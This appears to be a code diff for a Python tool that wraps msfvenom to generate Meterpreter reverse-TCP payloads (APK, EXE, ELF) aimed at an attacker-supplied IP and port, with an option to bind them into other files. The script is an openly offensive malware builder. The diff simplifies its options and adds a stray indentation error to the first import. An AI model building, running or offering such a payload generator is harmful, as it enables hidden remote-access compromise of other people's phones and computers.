@@ -1,4 +1,4 @@
-import os
+      import os
 import platform
 import logging
 import subprocess
@@ -33,7 +33,7 @@ def execute_command(command, verbose=False):
         logging.error(error_message)
         return error_message
 
-def generate_payload(ip, port, payload_type, android_api_level=None, bind=False, bind_file=None, custom_output_file=None, verbose=False):
+def generate_payload(ip, port, payload_type, android_api_level=None, bind=False, bind_file=None, verbose=False):
     if not ip or not port:
         error_message = "IP address and port are required."
         logging.error(error_message)
@@ -41,17 +41,17 @@ def generate_payload(ip, port, payload_type, android_api_level=None, bind=False,
 
     if payload_type == "android":
         if android_api_level:
-            output_file = custom_output_file if custom_output_file else "payload.apk"
+            output_file = "payload.apk"
             payload_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {output_file} -t apk -a dalvik --platform android -A {android_api_level}"
         else:
             error_message = "Android API level is required for Android payload."
             logging.error(error_message)
             return error_message
     elif payload_type == "windows":
-        output_file = custom_output_file if custom_output_file else "payload.exe"
+        output_file = "payload.exe"
         payload_command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o {output_file}"
     elif payload_type == "linux":
-        output_file = custom_output_file if custom_output_file else "payload.elf"
+        output_file = "payload.elf"
         payload_command = f"msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f elf -o {output_file}"
     else:
         error_message = "Unsupported payload type."
@@ -94,8 +94,6 @@ def generate_payload(ip, port, payload_type, android_api_level=None, bind=False,
     return success_message
 
 if __name__ == "__main__":
-    verbose = True
-
     ip = input("Enter your IP address: ")
     port = input("Enter the port: ")
     payload_type = input("Enter payload type (android/windows/linux): ").lower()
@@ -103,9 +101,8 @@ if __name__ == "__main__":
 
     bind = input("Do you want to bind payloads? (yes or no): ").strip().lower() == "yes"
     bind_file = input("Enter the path to the file you want to bind (leave empty if not binding): ").strip()
-    
-result = generate_payload(ip, port, payload_type, android_api_level, bind, bind_file, verbose=verbose)
+    verbose = True
 
-
+    result = generate_payload(ip, port, payload_type, android_api_level, bind, bind_file, verbose)
     print(result)
-                                                                                                                                
+                                              
